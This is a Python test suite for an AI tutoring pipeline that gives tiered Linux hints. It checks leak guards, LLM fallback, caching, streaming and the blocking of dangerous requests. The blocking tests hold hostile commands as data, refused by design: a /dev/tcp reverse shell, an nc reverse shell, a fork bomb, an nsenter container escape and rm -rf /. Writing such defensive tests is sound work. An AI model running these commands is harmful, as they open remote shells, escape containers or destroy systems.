import types

import pytest

import agents.llm as llm_module
from agents.llm import LLMClient
from agents.mentor import AIMentor, MAX_TIER, SYSTEM_PROMPT, forbidden_snippets, leaks
from pipeline import TTLCache, cache_key, run_agent_pipeline

from conftest import ALL_STEPS, tree


class StubLLM:
    """Stands in for the Claude client wrapper."""

    def __init__(self, reply="A hint from the model.", available=True):
        self.reply = reply
        self.available = available
        self.calls = []

    def complete(self, system, user):
        self.calls.append((system, user))
        return self.reply


def ask(query, step, tier, history=None, telemetry=None, mentor=None, cache=None, unit="linux-basics", number=2):
    return run_agent_pipeline(query, unit, number, history or [], telemetry, step, tier,
                              mentor_agent=mentor or AIMentor(llm=None), cache=cache or TTLCache(1, 1))


# ── leak guard ───────────────────────────────────────────────

SITUATIONS = [([], tree()), (["ls -la"], None), (["mkdir work", "cd work"], tree("work/"))]


@pytest.mark.parametrize("unit,number,step", ALL_STEPS, ids=[f"{u}-{n}" for u, n, _ in ALL_STEPS])
def test_no_rule_based_hint_leaks_for_any_step_at_any_tier(unit, number, step):
    for tier in (1, 2, 3):
        for history, telemetry in SITUATIONS:
            hint = ask("verify keeps failing, what is the exact command", step, tier, history, telemetry, unit=unit, number=number)["hint"]
            assert hint.strip()
            assert not leaks(hint, step, tier), f"tier {tier}: {hint}"


def test_leak_rules_by_tier(project_step):
    check = project_step["verificationCommand"]
    assert leaks(f"Run this: {check}", project_step, 3)
    assert leaks("Try `mkdir -p webapp/src`", project_step, 1)        # a command at tier 1
    assert leaks("Try `mkdir -p webapp/src`", project_step, 2)        # the step's own tool at tier 2
    assert not leaks("Try `mkdir -p webapp/src`", project_step, 3)
    assert not leaks("Check with `ls -la` first", project_step, 2)    # inspection is fine at tier 2
    assert leaks("Check with `ls -la` first", project_step, 1)
    assert leaks("```\nmkdir a\n```", project_step, 2)
    assert not leaks("Think about `mkdir` and the `webapp` folder.", project_step, 1)


def test_whitespace_changes_do_not_hide_a_leak(project_step):
    spaced = project_step["verificationCommand"].replace(" && ", "  &&\n  ")
    assert leaks(spaced, project_step, 3)


def test_a_check_that_is_just_a_taught_command_is_not_a_secret():
    step = {"title": "Where am I", "tasks": ["Run `pwd` to see your current directory"], "verificationCommand": "pwd"}
    assert forbidden_snippets(step, 3) == []
    assert not leaks("Do this task next: Run `pwd` to see your current directory", step, 3)


# ── rule-based tiers ─────────────────────────────────────────

def test_tier_one_explains_the_concept_without_commands(project_step):
    hint = ask("what do I do", project_step, 1)["hint"]
    assert "Create a Project Structure" in hint
    assert "`" not in hint or all(" " not in part for part in hint.split("`")[1::2])


def test_tier_two_reports_what_is_missing_from_the_sandbox(project_step):
    result = ask("verify fails", project_step, 2, ["mkdir webapp", "mkdir webapp/src"], tree("webapp/", "webapp/src/"))
    assert "`webapp/public`" in result["hint"] and "`webapp/config`" in result["hint"]
    assert "`webapp/src`," not in result["hint"]
    assert result["diagnostics"]["present"] == ["webapp/src"]


def test_tier_two_calls_out_a_typo(project_step):
    result = ask("command not found", project_step, 2, ["mkidr webapp"], tree())
    assert "`mkidr`" in result["hint"] and "`mkdir`" in result["hint"]
    assert result["assessment"]["typo"] == {"typed": "mkidr", "expected": "mkdir"}


def test_tier_two_without_telemetry_makes_no_claims_about_files(project_step):
    hint = ask("verify fails", project_step, 2, ["mkdir webapp"], None)["hint"]
    assert "does not have" not in hint
    assert "`touch`" in hint  # falls back to what they have not used


def test_tier_three_points_at_the_next_task_and_its_command_form(project_step):
    dirs_missing = ask("help", project_step, 3, ["mkdir webapp"], tree("webapp/"))["hint"]
    assert "subdirectories" in dirs_missing and "mkdir -p <dir>" in dirs_missing

    files_missing = ask("help", project_step, 3, ["mkdir -p webapp/src"],
                        tree("webapp/", "webapp/src/", "webapp/public/", "webapp/config/"))["hint"]
    assert "Create files" in files_missing and "touch <file>" in files_missing


def test_works_without_a_step():
    for tier in (1, 2, 3):
        result = ask("how do pipes work", None, tier, unit="general", number=1)
        assert result["hint"].strip()
        assert result["blocked"] is False


def test_tier_is_clamped():
    assert AIMentor(llm=None).generate_hint(99, "q", None, {}, {}, [])["tier"] == MAX_TIER
    assert AIMentor(llm=None).generate_hint(0, "q", None, {}, {}, [])["tier"] == 1
    assert AIMentor(llm=None).generate_hint(None, "q", None, {}, {}, [])["tier"] == 1


# ── LLM path ─────────────────────────────────────────────────

def test_llm_answer_is_used_when_available(project_step):
    llm = StubLLM("Directories have to exist before files can go inside them.")
    result = ask("why does touch fail", project_step, 1, ["touch webapp/src/a"], tree(), mentor=AIMentor(llm))

    assert result == {**result, "hint": llm.reply, "source": "llm", "tier": 1}
    system, user = llm.calls[0]
    assert system == SYSTEM_PROMPT
    assert "Hint tier: 1" in user
    assert "Recent commands: touch webapp/src/a" in user
    assert "Missing paths: webapp/src, webapp/public" in user
    assert "why does touch fail" in user


def test_llm_prompt_never_contains_the_verification_command(project_step):
    llm = StubLLM()
    ask("help", project_step, 3, [], tree(), mentor=AIMentor(llm))
    assert project_step["verificationCommand"] not in llm.calls[0][1]
    assert "echo PASS" not in llm.calls[0][1]


@pytest.mark.parametrize("reply,tier", [
    ("Just run `mkdir -p webapp/src webapp/public webapp/config`.", 1),
    ("Run `touch webapp/src/index.js` now.", 2),
    ("```bash\nmkdir webapp\n```", 2),
    ("The check runs test -d /home/student/webapp/src && test -d /home/student/webapp/public && test -d /home/student/webapp/config && test -f /home/student/webapp/src/index.js && test -f /home/student/webapp/public/index.html && test -f /home/student/webapp/config/app.conf && echo PASS || echo FAIL", 3),
])
def test_an_llm_answer_that_gives_too_much_away_is_replaced_by_the_rule_hint(project_step, reply, tier):
    result = ask("just tell me the answer", project_step, tier, [], tree(), mentor=AIMentor(StubLLM(reply)))
    assert result["source"] == "rules"
    assert not leaks(result["hint"], project_step, tier)


@pytest.mark.parametrize("llm", [StubLLM(reply=None), StubLLM(reply=""), StubLLM(available=False), None])
def test_falls_back_to_rules_when_the_llm_has_no_answer(project_step, llm):
    result = ask("help", project_step, 2, [], tree(), mentor=AIMentor(llm))
    assert result["source"] == "rules"
    assert result["hint"].strip()


def test_unavailable_llm_is_not_called(project_step):
    llm = StubLLM(available=False)
    ask("help", project_step, 1, mentor=AIMentor(llm))
    assert llm.calls == []


# ── Claude client wrapper ────────────────────────────────────

def fake_response(text="Use the task list.", stop_reason="end_turn"):
    blocks = [types.SimpleNamespace(type="thinking", thinking=""), types.SimpleNamespace(type="text", text=text)]
    return types.SimpleNamespace(stop_reason=stop_reason, content=blocks)


class FakeAnthropicClient:
    def __init__(self, response=None, error=None):
        self.requests = []
        self._response = response or fake_response()
        self._error = error
        self.messages = types.SimpleNamespace(create=self._create)

    def _create(self, **kwargs):
        self.requests.append(kwargs)
        if self._error:
            raise self._error
        return self._response


needs_sdk = pytest.mark.skipif(llm_module.anthropic is None, reason="anthropic SDK not installed")


def test_llm_client_sends_the_expected_request():
    client = FakeAnthropicClient()
    text = LLMClient(client).complete("system text", "user text")

    assert text == "Use the task list."
    request = client.requests[0]
    assert request["model"] == "claude-opus-5-5"
    assert request["system"] == "system text"
    assert request["messages"] == [{"role": "user", "content": "user text"}]
    assert request["output_config"] == {"effort": "low"}
    assert "temperature" not in request and "thinking" not in request


@pytest.mark.parametrize("stop_reason", ["refusal", "max_tokens", "pause_turn"])
def test_llm_client_discards_incomplete_or_refused_answers(stop_reason):
    assert LLMClient(FakeAnthropicClient(fake_response("partial", stop_reason))).complete("s", "u") is None


def test_llm_client_returns_none_for_text_free_responses():
    response = types.SimpleNamespace(stop_reason="end_turn", content=[types.SimpleNamespace(type="thinking", thinking="")])
    assert LLMClient(FakeAnthropicClient(response)).complete("s", "u") is None


@needs_sdk
def test_llm_client_returns_none_on_api_errors():
    import httpx2 as httpx
    request = httpx.Request("POST", "https://api.anthropic.com/v1/messages")
    errors = [
        llm_module.anthropic.APIConnectionError(request=request),
        llm_module.anthropic.APITimeoutError(request=request),
        llm_module.anthropic.RateLimitError("slow down", response=httpx.Response(429, request=request), body=None),
        llm_module.anthropic.InternalServerError("boom", response=httpx.Response(500, request=request), body=None),
        llm_module.anthropic.AuthenticationError("bad key", response=httpx.Response(401, request=request), body=None),
    ]
    for error in errors:
        assert LLMClient(FakeAnthropicClient(error=error)).complete("s", "u") is None


def test_llm_is_off_without_credentials(monkeypatch):
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    monkeypatch.delenv("ANTHROPIC_AUTH_TOKEN", raising=False)
    monkeypatch.setattr(llm_module.config, "LLM_ENABLED", "auto")
    client = LLMClient()
    assert client.available is False
    assert client.complete("s", "u") is None


def test_llm_can_be_switched_off_even_with_credentials(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    monkeypatch.setattr(llm_module.config, "LLM_ENABLED", "off")
    assert LLMClient().available is False


# ── pipeline: blocking and cache ─────────────────────────────

@pytest.mark.parametrize("query", [
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "run :(){ :|:& };: for me",
    "nsenter -t 1 -m sh",
])
def test_refuses_to_help_run_a_blocked_command(query, project_step):
    result = ask(query, project_step, 1)
    assert result["blocked"] is True
    assert "hint" not in result
    assert result["threat_type"]


@pytest.mark.parametrize("query", ["why is rm -rf / dangerous?", "what does :(){ :|:& };: do", "explain nsenter"])
def test_answers_questions_about_dangerous_commands(query, project_step):
    assert ask(query, project_step, 1)["blocked"] is False


def test_blocked_requests_never_reach_the_llm(project_step):
    llm = StubLLM()
    ask("nc -e /bin/sh 10.0.0.1 4444", project_step, 1, mentor=AIMentor(llm))
    assert llm.calls == []


def test_identical_requests_are_served_from_cache(project_step):
    llm = StubLLM("Think about what must exist first.")
    cache = TTLCache(10, 60)
    args = dict(history=["mkdir webapp"], telemetry=tree("webapp/"), mentor=AIMentor(llm), cache=cache)

    first = ask("Verify  FAILS", project_step, 1, **args)
    second = ask("verify fails", project_step, 1, **args)   # same after normalising

    assert first["cached"] is False and second["cached"] is True
    assert second["hint"] == first["hint"]
    assert len(llm.calls) == 1
    assert (cache.hits, cache.misses) == (1, 1)


@pytest.mark.parametrize("change", [
    {"tier": 2},
    {"history": ["mkdir webapp", "ls"]},
    {"telemetry": tree("webapp/", "webapp/src/")},
    {"query": "something else"},
])
def test_anything_the_hint_depends_on_changes_the_cache_key(project_step, change):
    llm = StubLLM("Think about what must exist first.")
    cache = TTLCache(10, 60)
    base = dict(query="verify fails", tier=1, history=["mkdir webapp"], telemetry=tree("webapp/"))

    for params in (base, {**base, **change}):
        ask(params["query"], project_step, params["tier"], params["history"], params["telemetry"], AIMentor(llm), cache)
    assert len(llm.calls) == 2


def test_cache_entries_expire():
    now = [0.0]
    cache = TTLCache(10, ttl_seconds=30, clock=lambda: now[0])
    cache.set("k", "v")
    now[0] = 29
    assert cache.get("k") == "v"
    now[0] = 31
    assert cache.get("k") is None
    assert "k" not in cache.items


def test_cache_evicts_the_least_recently_used():
    cache = TTLCache(2, 60)
    cache.set("a", 1)
    cache.set("b", 2)
    cache.get("a")
    cache.set("c", 3)
    assert cache.get("b") is None
    assert cache.get("a") == 1 and cache.get("c") == 3


def test_cache_key_is_stable_and_order_insensitive_for_dicts():
    one = cache_key("q", "u", 1, 1, {"a": 1, "b": 2}, ["x"], None)
    two = cache_key("q", "u", 1, 1, {"b": 2, "a": 1}, ["x"], None)
    assert one == two
    assert one != cache_key("q", "u", 2, 1, {"a": 1, "b": 2}, ["x"], None)


# ── Streamed hints ───────────────────────────────────────────

class StreamingLLM(StubLLM):
    """Writes its reply in small pieces, optionally failing part-way."""

    def __init__(self, reply="", pieces=None, fail_after=None, **kwargs):
        super().__init__(reply=reply, **kwargs)
        self.pieces = pieces if pieces is not None else [reply[i:i + 7] for i in range(0, len(reply), 7)]
        self.fail_after = fail_after
        self.streamed = 0

    def stream(self, system, user):
        self.calls.append((system, user))
        for index, piece in enumerate(self.pieces):
            if self.fail_after is not None and index >= self.fail_after:
                raise llm_module.LLMStreamError("cut off")
            self.streamed += 1
            yield piece


def stream(query, step, tier, mentor, history=None, telemetry=None, cache=None):
    from pipeline import stream_agent_pipeline
    return list(stream_agent_pipeline(query, "linux-basics", 2, history or [], telemetry, step, tier,
                                      mentor_agent=mentor, cache=cache or TTLCache(1, 1)))


def shown(events):
    """What the student ends up seeing: deltas joined, starting again after each reset."""
    text = ""
    for event in events:
        if event["type"] == "reset":
            text = ""
        elif event["type"] == "delta":
            text += event["text"]
    return text


def test_streamed_hint_arrives_in_pieces_and_matches_the_final_answer(project_step):
    reply = "Directories have to exist first. Look at what the listing shows. Then compare it with the task list."
    events = stream("why does touch fail", project_step, 1, AIMentor(StreamingLLM(reply)))

    deltas = [e for e in events if e["type"] == "delta"]
    assert len(deltas) >= 3, "sentences are released as they finish"
    assert all(e["type"] != "reset" for e in events)
    done = events[-1]
    assert done["type"] == "done"
    assert done["data"]["hint"] == reply and done["data"]["source"] == "llm"
    assert shown(events) == reply
    # The response has the same shape as the non-streaming pipeline.
    assert set(done["data"]) == set(ask("why does touch fail", project_step, 1, mentor=AIMentor(None)))


def test_streamed_text_is_held_back_until_a_sentence_is_complete(project_step):
    llm = StreamingLLM(pieces=["Check the ", "folder first", ". Then", " look again."])
    events = list(AIMentor(llm).stream_hint(1, "help", project_step, {"detected_issue": None, "typo": None, "unused_tools": []}, {}, []))
    texts = [e["text"] for e in events if e["type"] == "delta"]
    assert texts == ["Check the folder first. ", "Then look again."]


def test_a_leak_part_way_through_never_reaches_the_student(project_step):
    command = "mkdir -p webapp/src"  # a full command is more than a tier 1 nudge may give
    reply = f"Start by reading the task. Now just run `{command}` and you are done. Good luck."
    events = stream("help", project_step, 1, AIMentor(StreamingLLM(reply)))

    everything_sent = "".join(e.get("text", "") for e in events)
    assert command not in everything_sent, "the leaked command was never sent, not even before the reset"
    assert any(e["type"] == "reset" for e in events), "the clean first sentence had been shown, so it is taken back"
    done = events[-1]["data"]
    assert done["source"] == "rules"
    assert shown(events) == done["hint"]
    assert not leaks(done["hint"], project_step, 1)


def test_an_unclosed_code_span_is_not_released(project_step):
    # A sentence can end inside backticks. The command there is only recognisable
    # once the span closes, so nothing past the last complete span is sent early.
    llm = StreamingLLM(pieces=["Try this. Run `mkdir -p. ", "webapp/src` now. ", "Done."])
    events = stream("help", project_step, 1, AIMentor(llm))
    deltas = [e["text"] for e in events if e["type"] == "delta"]
    assert deltas[0] == "Try this. "
    assert "mkdir" not in "".join(e.get("text", "") for e in events if e["type"] == "delta" and e["text"] != events[-1]["data"]["hint"])
    assert events[-1]["data"]["source"] == "rules"


@pytest.mark.parametrize("fail_after", [0, 2])
def test_a_stream_that_fails_falls_back_to_the_rule_based_hint(project_step, fail_after):
    reply = "First sentence is fine. Second sentence is fine too. Third one never arrives."
    events = stream("help", project_step, 2, AIMentor(StreamingLLM(reply, fail_after=fail_after)), telemetry=tree())
    done = events[-1]["data"]
    assert done["source"] == "rules" and done["hint"].strip()
    assert shown(events) == done["hint"]


def test_without_an_llm_the_stream_is_the_rule_based_hint_in_one_piece(project_step):
    for mentor_agent in (AIMentor(None), AIMentor(StubLLM(available=False)), AIMentor(StubLLM("no stream method"))):
        events = stream("help", project_step, 2, mentor_agent, telemetry=tree())
        assert [e["type"] for e in events] == ["delta", "done"]
        assert events[-1]["data"]["source"] == "rules"
        assert events[0]["text"] == events[-1]["data"]["hint"]


def test_streamed_hints_are_cached_and_blocked_requests_are_not_streamed(project_step):
    cache = TTLCache(8, 60)
    llm = StreamingLLM("Look at the folder listing first. Then compare it with the tasks.")
    first = stream("where am I going wrong", project_step, 1, AIMentor(llm), cache=cache)
    again = stream("where am I going wrong", project_step, 1, AIMentor(llm), cache=cache)
    assert len(llm.calls) == 1, "the second request did not call the model"
    assert again[-1]["data"]["cached"] is True
    assert shown(again) == shown(first)

    blocked = stream("rm -rf / --no-preserve-root", project_step, 1, AIMentor(llm), cache=cache)
    assert [e["type"] for e in blocked] == ["done"]
    assert blocked[0]["data"]["blocked"] is True


class FakeStream:
    def __init__(self, pieces, stop_reason, error=None):
        self.pieces, self.stop_reason, self.error = pieces, stop_reason, error

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False

    @property
    def text_stream(self):
        for piece in self.pieces:
            yield piece
        if self.error:
            raise self.error

    def get_final_message(self):
        return types.SimpleNamespace(stop_reason=self.stop_reason)


def streaming_client(pieces, stop_reason="end_turn", error=None):
    requests = []

    def start(**kwargs):
        requests.append(kwargs)
        return FakeStream(pieces, stop_reason, error)

    return types.SimpleNamespace(messages=types.SimpleNamespace(stream=start), requests=requests)


def test_llm_client_streams_text_with_the_same_request_as_a_normal_call():
    client = streaming_client(["Use ", "", "the task list."])
    assert list(LLMClient(client).stream("system text", "user text")) == ["Use ", "the task list."]
    request = client.requests[0]
    assert request["model"] == "claude-opus-5-5"
    assert request["system"] == "system text"
    assert request["messages"] == [{"role": "user", "content": "user text"}]
    assert request["output_config"] == {"effort": "low"}
    assert "temperature" not in request and "thinking" not in request


@pytest.mark.parametrize("stop_reason", ["refusal", "max_tokens", "pause_turn"])
def test_llm_client_stream_rejects_incomplete_or_refused_answers(stop_reason):
    with pytest.raises(llm_module.LLMStreamError):
        list(LLMClient(streaming_client(["partial"], stop_reason)).stream("s", "u"))


def test_llm_client_stream_turns_any_failure_into_one_error():
    with pytest.raises(llm_module.LLMStreamError):
        list(LLMClient(streaming_client(["partial"], error=RuntimeError("connection lost"))).stream("s", "u"))
    unavailable = LLMClient(None)
    unavailable._resolved = True
    with pytest.raises(llm_module.LLMStreamError):
        list(unavailable.stream("s", "u"))


# ── JSON answers (used by the interview answer judge) ────────

SCHEMA = {"type": "object", "properties": {"ok": {"type": "boolean"}}, "required": ["ok"], "additionalProperties": False}


def test_llm_client_asks_for_json_matching_the_schema():
    client = FakeAnthropicClient(fake_response('{"ok": true}'))
    assert LLMClient(client).complete_json("system text", "user text", SCHEMA) == {"ok": True}
    request = client.requests[0]
    assert request["output_config"] == {"effort": "low", "format": {"type": "json_schema", "schema": SCHEMA}}
    assert request["model"] == "claude-opus-5-5" and request["system"] == "system text"
    assert "tool_choice" not in request and "thinking" not in request


@pytest.mark.parametrize("response", [
    fake_response("not json at all"),
    fake_response('["a list, not an object"]'),
    fake_response('{"ok": true}', stop_reason="refusal"),
    fake_response('{"ok": tr', stop_reason="max_tokens"),
])
def test_llm_client_json_returns_none_for_anything_unusable(response):
    assert LLMClient(FakeAnthropicClient(response)).complete_json("s", "u", SCHEMA) is None


def test_llm_client_json_returns_none_when_unavailable():
    unavailable = LLMClient(None)
    unavailable._resolved = True
    assert unavailable.complete_json("s", "u", SCHEMA) is None
